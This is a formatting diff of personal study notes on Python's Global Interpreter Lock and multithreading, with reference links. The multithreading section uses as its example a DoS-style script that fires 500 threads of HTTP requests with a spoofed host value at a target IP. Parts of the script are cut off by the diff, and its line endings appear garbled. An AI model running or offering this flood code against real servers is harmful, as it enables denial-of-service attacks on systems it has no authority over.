@@ -6,22 +6,16 @@ Modified: 2022-05-13 15:19:51 +0500
 
 ---
 
-**Global Interpreter Lock (GIL)**
+## Global Interpreter Lock (GIL)
 
 GIL is a mutex that protects access to Python objects, preventing multiple threads from executing Python bytecodes at once. This lock is necessary mainly because CPython's memory management is not thread-safe.
 
-
-
 This essentially means that a process can run only one thread at a time. When a thread starts running, it acquires GIL and when it waits for I/O, it releases the GIL, so that other threads of that process can run.
-
-
 
 Solution -
 -   Run multiple Python instances
 
-
-
-**References**
+## References
 
 <https://wiki.python.org/moin/GlobalInterpreterLock>
 
@@ -39,23 +33,17 @@ Solution -
 
 [Back to Basics: Concurrency](https://youtu.be/5pYKAoD3Apk) - C++
 
-
-
-**MultiThreading**
+## MultiThreading
 
 import threading
 
 import socket
-
-
 
 target = '10.0.0.138'
 
 port = 80
 
 fake_ip = '182.21.20.32'
-
-
 
 def attack():
 
@@ -71,14 +59,10 @@ s.sendto(("Host: " + fake_ip + " rnrn").encode('ascii'), (target, port))
 
 s.close()
 
-
-
 for i in range(500):
 
 thread = threading.Thread(target=attack)
 
 thread.start()
-
-
 
 <https://bovage.hashnode.dev/what-exactly-is-multithreading>
